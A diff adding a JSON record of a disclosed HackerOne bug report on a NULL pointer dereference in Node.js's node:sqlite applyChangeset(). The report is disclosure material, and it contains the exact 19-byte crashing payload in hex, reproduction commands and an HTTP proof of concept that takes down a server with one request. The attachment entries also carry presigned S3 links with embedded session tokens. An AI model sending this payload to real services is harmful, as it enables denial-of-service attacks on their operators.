@@ -1,0 +1,139 @@
+{
+  "id": 3736889,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNzM2ODg5",
+  "url": "https://hackerone.com/reports/3736889",
+  "title": "NULL pointer dereference in node:sqlite DatabaseSync#applyChangeset() via malformed SQLite changeset",
+  "state": "Closed",
+  "substate": "informative",
+  "severity_rating": "high",
+  "readable_substate": "Informative",
+  "created_at": "2026-05-15T02:27:20.425Z",
+  "submitted_at": "2026-05-15T02:27:21.335Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "junius",
+    "url": "/junius",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 22984,
+    "url": "https://hackerone.com/nodejs",
+    "handle": "nodejs",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js",
+      "twitter_handle": "nodejs",
+      "website": "https://nodejs.org",
+      "about": "The Node.js JavaScript Runtime"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": true,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-05-23T16:10:45.953Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-05-23T16:10:45.288Z",
+  "team_member_agreed_on_going_public_at": "2026-05-23T16:04:19.703Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary:** A 19-byte malformed SQLite changeset passed to Node.js `node:sqlite` `DatabaseSync#applyChangeset()` causes a native NULL pointer dereference and terminates the Node.js process.\n\n**Description:** The built-in Node.js `node:sqlite` API exposes `DatabaseSync#applyChangeset(changeset[, options])`, which accepts a `Uint8Array` binary changeset and is documented as a wrapper around SQLite `sqlite3changeset_apply()`.\n\nI found a malformed 19-byte changeset that causes a process crash when passed to `DatabaseSync#applyChangeset()` against a compatible target schema. The failure is not a JavaScript exception that an application can catch. The process terminates with SIGSEGV / exit 139.\n\nThe issue is reachable through a public Node.js API. I also included an end-to-end HTTP PoC showing the practical consumer scenario: a minimal Node.js HTTP service reads the request body as a changeset and calls `db.applyChangeset(body)`. A single POST request containing the 19-byte payload causes the server process to crash.\n\nTested official Node.js Linux x64 builds:\n\n| Node.js version | Bundled SQLite version | Result |\n|---|---:|---|\n| v22.22.3 | 3.51.3 | SIGSEGV / exit 139 |\n| v24.15.0 | 3.51.3 | SIGSEGV / exit 139 |\n| v26.1.0 | 3.53.0 | SIGSEGV / exit 139 |\n\nI also reproduced the underlying `sqlite3changeset_apply()` crash with standalone SQLite upstream 3.53.1, which is the latest SQLite release I found in the official SQLite release history at the time of testing. This supports that the root cause is still present in current upstream SQLite, while the Node.js-specific impact is reachability through the public `node:sqlite` API.\n\n## Steps To Reproduce:\n\nI attached a self-contained PoC package:\n\n```text\nNodejs_PoC.zip\n```\n\nPayload file inside the package:\n\n```text\npoc/nullpk_19b.changeset\n```\n\nPayload hex:\n\n```text\n54 04 01 00 00 00 74 31 00 17 7e 00 72 28 65 65 28 65 65\n```\n\n### Direct API crash\n\n1. Extract the attached PoC package on Linux or WSL:\n\n   ```sh\nunzip Nodejs_PoC.zip\ncd Nodejs_PoC\n   ```\n\n2. Point `NODE_BIN` to an affected Node.js binary. For example:\n\n   ```sh\n   export NODE_BIN=/path/to/node\n   $NODE_BIN --version\n   ```\n\n   I reproduced with official Linux x64 Node.js v22.22.3, v24.15.0, and v26.1.0.\n\n3. Run the direct API PoC:\n\n   ```sh\n   NODE_BIN=$NODE_BIN ./run_direct.sh\n   ```\n\n4. Expected result:\n\n   ```text\n   NODE_BIN=/path/to/node\n   node=v22.22.3\n   sqlite=3.51.3\n   payload_len=19\n   Segmentation fault (core dumped)\n   ```\n\n### HTTP end-to-end crash\n\n1. In terminal 1, start the sample HTTP service:\n\n   ```sh\n   cd sqlite_node_applychangeset_submission_package_20260515\n   export NODE_BIN=/path/to/node\n   NODE_BIN=$NODE_BIN ./run_http_server.sh\n   ```\n\n   Expected:\n\n   ```text\n   NODE_BIN=/path/to/node\n   node=v22.22.3\n   sqlite=3.51.3\n   listening=http://127.0.0.1:31337/apply\n   ```\n\n2. In terminal 2, confirm that the endpoint is alive with an empty POST:\n\n   ```sh\n   curl -i -X POST http://127.0.0.1:31337/apply \\\n     -H 'Content-Type: application/octet-stream' \\\n     --data-binary ''\n   ```\n\n   Expected client result:\n\n   ```text\n   HTTP/1.1 200 OK\n   ...\n   ok\n   ```\n\n   Expected server log:\n\n   ```text\n   received=0\n   ```\n\n3. In terminal 2, send the malformed 19-byte changeset:\n\n   ```sh\n   ./run_http_client.sh http://127.0.0.1:31337/apply\n   ```\n\n   Expected client result:\n\n   ```text\n   url=http://127.0.0.1:31337/apply\n   payload_len=19\n   request_error=RemoteDisconnected: Remote end closed connection without response\n   ```\n\n   Expected server result:\n\n   ```text\n   received=19\n   Segmentation fault (core dumped)\n   ```\n\nI also reproduced the HTTP PoC manually on WSL using the official Node.js v22.22.3 Linux x64 binary. The server logged `received=0` for the empty POST, then `received=19` for the malformed changeset, and then terminated with `Segmentation fault (core dumped)`.\n\nFor the standalone SQLite upstream check, I compiled SQLite 3.53.1 with `SQLITE_ENABLE_SESSION` and `SQLITE_ENABLE_PREUPDATE_HOOK`, then ran the attached C harness against the same 19-byte changeset. It printed `sqlite_version=3.53.1`, `payload_len=19`, and then exited with SIGSEGV / exit 139. The gdb stack again reached `sqlite3_value_type(NULL)` through `sessionBindValue()`, `sessionApplyOneOp()`, and `sqlite3changeset_apply()`.\n\nI am not claiming that the Node.js wrapper itself is the root cause. The links below document the Node.js reachability path: in the current Node.js source, `DatabaseSync::ApplyChangeset()` accepts a `Uint8Array` and forwards it to SQLite `sqlite3changeset_apply()`, where the native crash occurs in the tested binaries. The tested release binaries show the same call path in the gdb backtrace.\n\n* `DatabaseSync::ApplyChangeset()`: `https://github.com/nodejs/node/blob/main/src/node_sqlite.cc#L2244`\n* the wrapper forwards the supplied `Uint8Array` to `sqlite3changeset_apply()`: `https://github.com/nodejs/node/blob/main/src/node_sqlite.cc#L2347-L2353`\n* `applyChangeset` is exposed on `DatabaseSync`: `https://github.com/nodejs/node/blob/main/src/node_sqlite.cc#L3954-L3955`\n\nThe gdb stack from the attached logs:\n\n```text\nThread 1 \"node\" received signal SIGSEGV, Segmentation fault.\n#0  sessionApplyOneOp()\n#1  sessionApplyOneWithRetry()\n#2  sessionChangesetApply()\n#3  sqlite3changeset_apply()\n#4  node::sqlite::DatabaseSync::ApplyChangeset(...)\n\n## Impact\n\nA Node.js process can be terminated by attacker-controlled changeset bytes when an application accepts a SQLite changeset across a trust boundary and passes it to `DatabaseSync#applyChangeset()`.\n\nThe attached HTTP PoC demonstrates the network-facing consumer pattern:\n\n```js\nreq.on('end', () => {\n  const changeset = Buffer.concat(chunks);\n  db.applyChangeset(changeset);\n});\n```\n\nBecause the failure is a native SIGSEGV in the SQLite apply path, JavaScript `try/catch` around application-level logic cannot reliably recover once the process faults. Supervisors such as systemd, PM2, or Kubernetes may restart the process, but repeated requests can still cause repeated service interruption.\n\nThis report should be treated as availability-only:\n\n* Confidentiality: none demonstrated\n* Integrity: none demonstrated\n* Availability: high, process termination\n\nIf Node.js triage considers only direct local API invocation rather than a network-consuming application, a lower local-attack vector may be more appropriate. I selected the network vector because Node.js exposes the affected primitive as a public API intended for applying binary changesets, and the attached HTTP PoC shows a realistic network service pattern.",
+  "weakness": {
+    "id": 51,
+    "name": "NULL Pointer Dereference"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 5921983,
+      "file_name": "images_video.zip",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/0pd5mu0jdkeqoc56xktlo0zc8e91?response-content-disposition=attachment%3B%20filename%3D%22images_video.zip%22%3B%20filename%2A%3DUTF-8%27%27images_video.zip&response-content-type=application%2Fzip&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQMECDWPF%2F20260523%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260523T162106Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEG4aCXVzLXdlc3QtMiJHMEUCIQCPsaxPzzuAtCiySHmCl7dL2xatzutNVkd%2BUNVBvp2awwIgEIRWiuXy2OXj%2FK56lI5I83s4lsjA8Z01%2FMNtwYDQCeEqsgUINhADGgwwMTM2MTkyNzQ4NDkiDNk7zNengi6zJfJ0WiqPBZ8kBjv4pvz4pGIa%2Fue9BlI9qXCF2Bs9wjJXWF0cor8WQWkBUYr0PUtTOOJ3qVLBgOC2VxDzLhRilzloqgHbJi7ja6JZYA%2FDpwGP7MkrFFUBO8nH9iwqrlUGX79L3iJ9D358SfAMEZxZzm6pVqQ5RjNhsAwD08IlUKP1M3h%2FDmY4nnXMybtjzApj6DSdaPjiKzepOR6cuGlcBTYd2KovYjZ5gmzDnesnmum41d4vzcy9YRz8WI%2B8%2Bja85oFGhsXjMeUlkwq1aFFHeb9SkK6bRzKAK7%2B2HmQ66Sk43nX%2BZTZigxO11WxXMdgqNjo6blWWH%2BH0aaMBhJFyNW0kdbi5GmmFewU7aQCczs9D9mp%2F2OQQZMoYtZ5ynah7RVsKtPov901iZZ53fJcZPsIPR9qBDl6AagYxr4qM8GYmAQc2OJ3CtIbqWsOlDvg7V3tzCWZJ1pO5wi06kgep5Lr%2FUuJ5qZ255CLkK8I%2BGPQw7TnHpcAVx%2FfLBVrYT0BLd%2BVcNirgPS4FMLmvcp7zEfMP21C7KFPCu8LkFkVgA3mBeLLq6Jl7W2dtIoNgijrlUu5OAkNotCZcUT%2Bx5GpGxYeSEgXWc5LpfLqbI2FOu2CTQBxGtUEwt%2B%2FaVXGBeFD3htJL6rBetHQ3xcN6U2BZmJES3SAvaC0%2FoMg7RQjoMmgV3NiQ2L20ngrUf9rB%2FkQxgBH%2BebQbeNE%2BGXljppKNQ0s40E8Q6yWaksIt6vqISznFjLlIXDIwRqrvBHh573I%2FEDIW14RIBCjDOq5m9XgFKwfYsVVSTPLfQ3R08HqRcXMzT57hLv7DhOZeTPrFQLpzEmdwgbIFaHslPWqIQ8Wf78n9ahiPTT%2BE%2BFzWDDTDo6tDCmhcjcww4dPG0AY6sQEKtgcjo%2BHt0K0j%2BMc7Pifx8oXarKz2%2BoKM1%2BfYfVFI%2BikiG2hCDRxKXS4kl74ITvZr8HWT5Emlydxigl%2BsT00%2FMhy4aGJgMrh5WbnIblF1bgOGakiOJ05Jnyt0aXxs1FDitUSS9YYCWr%2BKqViaC%2FonT7rpA4zneYXalytM9zk%2B%2F9KBk%2Ftzk0teGjOAmKqFOv2Z7uuIsBd4CgvCp62Jvdsr7CZXUyz4CNd9S4x54IyDqzU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=9c2ee1b06884969f12a20df3a5d9a274c01d936f22a713c1fba8485942b46a95",
+      "file_size": 1191138,
+      "type": "application/zip",
+      "moderated": null
+    },
+    {
+      "id": 5921984,
+      "file_name": "Nodejs_PoC.zip",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ibdcav7hp2aeyqyk2xcm85g9obh7?response-content-disposition=attachment%3B%20filename%3D%22Nodejs_PoC.zip%22%3B%20filename%2A%3DUTF-8%27%27Nodejs_PoC.zip&response-content-type=application%2Fzip&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQMECDWPF%2F20260523%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260523T162106Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEG4aCXVzLXdlc3QtMiJHMEUCIQCPsaxPzzuAtCiySHmCl7dL2xatzutNVkd%2BUNVBvp2awwIgEIRWiuXy2OXj%2FK56lI5I83s4lsjA8Z01%2FMNtwYDQCeEqsgUINhADGgwwMTM2MTkyNzQ4NDkiDNk7zNengi6zJfJ0WiqPBZ8kBjv4pvz4pGIa%2Fue9BlI9qXCF2Bs9wjJXWF0cor8WQWkBUYr0PUtTOOJ3qVLBgOC2VxDzLhRilzloqgHbJi7ja6JZYA%2FDpwGP7MkrFFUBO8nH9iwqrlUGX79L3iJ9D358SfAMEZxZzm6pVqQ5RjNhsAwD08IlUKP1M3h%2FDmY4nnXMybtjzApj6DSdaPjiKzepOR6cuGlcBTYd2KovYjZ5gmzDnesnmum41d4vzcy9YRz8WI%2B8%2Bja85oFGhsXjMeUlkwq1aFFHeb9SkK6bRzKAK7%2B2HmQ66Sk43nX%2BZTZigxO11WxXMdgqNjo6blWWH%2BH0aaMBhJFyNW0kdbi5GmmFewU7aQCczs9D9mp%2F2OQQZMoYtZ5ynah7RVsKtPov901iZZ53fJcZPsIPR9qBDl6AagYxr4qM8GYmAQc2OJ3CtIbqWsOlDvg7V3tzCWZJ1pO5wi06kgep5Lr%2FUuJ5qZ255CLkK8I%2BGPQw7TnHpcAVx%2FfLBVrYT0BLd%2BVcNirgPS4FMLmvcp7zEfMP21C7KFPCu8LkFkVgA3mBeLLq6Jl7W2dtIoNgijrlUu5OAkNotCZcUT%2Bx5GpGxYeSEgXWc5LpfLqbI2FOu2CTQBxGtUEwt%2B%2FaVXGBeFD3htJL6rBetHQ3xcN6U2BZmJES3SAvaC0%2FoMg7RQjoMmgV3NiQ2L20ngrUf9rB%2FkQxgBH%2BebQbeNE%2BGXljppKNQ0s40E8Q6yWaksIt6vqISznFjLlIXDIwRqrvBHh573I%2FEDIW14RIBCjDOq5m9XgFKwfYsVVSTPLfQ3R08HqRcXMzT57hLv7DhOZeTPrFQLpzEmdwgbIFaHslPWqIQ8Wf78n9ahiPTT%2BE%2BFzWDDTDo6tDCmhcjcww4dPG0AY6sQEKtgcjo%2BHt0K0j%2BMc7Pifx8oXarKz2%2BoKM1%2BfYfVFI%2BikiG2hCDRxKXS4kl74ITvZr8HWT5Emlydxigl%2BsT00%2FMhy4aGJgMrh5WbnIblF1bgOGakiOJ05Jnyt0aXxs1FDitUSS9YYCWr%2BKqViaC%2FonT7rpA4zneYXalytM9zk%2B%2F9KBk%2Ftzk0teGjOAmKqFOv2Z7uuIsBd4CgvCp62Jvdsr7CZXUyz4CNd9S4x54IyDqzU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7a32c9dbc277b62d66f6085334a2ee901e2fde980013bb3b7a1dfd97dc73efdf",
+      "file_size": 11860,
+      "type": "application/zip",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 0,
+  "voters": [],
+  "severity": {
+    "rating": "high",
+    "score": 7.5,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "none",
+      "integrity": "none",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 666,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/nodejs/node",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
